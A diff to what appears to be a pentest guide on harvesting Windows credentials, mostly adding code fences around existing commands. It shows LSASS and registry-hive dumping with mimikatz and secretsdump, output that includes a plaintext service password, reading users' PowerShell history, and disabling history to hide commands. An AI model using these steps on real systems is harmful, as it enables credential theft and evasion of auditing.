@@ -1183,7 +1183,9 @@ SID               : S-1-5-21-1372086773-2238746523-2939299801-500
         ssp :
         credman :
         cloudap :
-Dump credentials with mimikatz ```
+  
+  ```
+Dump credentials with mimikatz
 Notwithstanding, you should be aware that LSASS can be protected against credential extraction.This could be achieved by Credential Guard, that uses the hypervisor technology to store the credentials in a safer place outside of the operative system. However Credential Guard can be bypassed.
 
 Additionally, lsass.exe can be configured to run as a PPL (Protected Process Light). Even if this makes more difficult the credentials extraction, it can be disabled.
@@ -1194,6 +1196,7 @@ Other location to find credentials is the registry. In the registry the computer
 
 The LSA secrets is an special storage located in the registry which is used to save sensible data that is only accessible for the SYSTEM local account. In the disk, the LSA secrets are saved in the SECURITY hive file, that is encrypted with the BootKey/SysKey (stored in the SYSTEM hive file).
 
+  ```diff
 PS C:\> whoami
 nt authority\system
 PS C:\> reg query HKLM\SECURITY\Policy\Secrets
@@ -1236,7 +1239,7 @@ lsadump::sam: Fetch the local account credentials.
 An alternative is to save a copy of the hive files with reg save command, move them to our machine, and finally to get the content with impacket secretsdump script or mimikatz.
 
 First you need to dump the registry hives. You will need the SECURITY and SAM hive files and also the SYSTEM hive since it contains the system Boot Key (or System Key) that allows to decrypt the SECURITY and SAM hives.
-
+```diff
 C:\>reg save HKLM\SYSTEM system.bin
 The operation completed successfully.
 
@@ -1245,9 +1248,10 @@ The operation completed successfully.
 
 C:\>reg save HKLM\SAM sam.bin
 The operation completed successfully.
+  ```
 reg command to save registry hives
 Once the hives were saved, then move then to your local machine and dump them with secretsdump:
-
+```diff
 $ secretsdump.py -system system.bin -security security.bin -sam sam.bin  LOCAL
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -1279,6 +1283,7 @@ NL$KM:0bbc2edba1a7e242566db84b5a3779a45351756d647f9abfdcbfc283f46402a65ee853abe5
 [*] _SC_mysql 
 (Unknown User):Solo1234!
 [*] Cleaning up...
+  ```
 Secretsdump usage to dump
 The Dumping cached domain logon information section contains the Domain Cached Credentials. In order to crack them, you need to saved them in format $DCC2$10240#username#hash, then you can use hashcat.
 
@@ -1291,20 +1296,25 @@ The DPAPI_SYSTEM section contains the master DPAPI keys of the system. These key
 The NK$LM give us the key used to encrypt the Domain Cached Credentials, but since secretsdump already decrypt them is only for informational purposes.
 
 Finally, the entries with format _SC_<service> are the ones that indicates the password of users that are running services. In this case, the mysql service. We don't know the username of the service user, but we can check it in the computer.
-
+```diff
 PS C:\> Get-WmiObject win32_service -Filter "name='mysql'" | select -ExpandProperty startname
 CONTOSO\han
+  ```
 Show user account that runs the mysql service
 Powershell history
 Apart from the LSASS process and registry, you can also search for credentials in other places like the Powershell history of users. You can use the following commands to locate and read the Powershell history.
-
+```diff
 (Get-PSReadlineOption).HistorySavePath
+  ```
 Get the Powershell history path of the current users.
-Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```diff
+  Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  ```
 Check the Powershell history of all users
 Also, as a tip, you may want to use the following command to avoid storing your own commands in the Powershell history.
-
+```diff
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
+  ```
 Disabling Powershell history
 Other places to find credentials in Windows
 Moreover, you can also search for credentials in scripts or configuration files located in the computer. There are also a lot of software like browsers that stores credentials that could be useful in a pentest, to check a good list of software that stores its credentials you can check the LaZagne project.
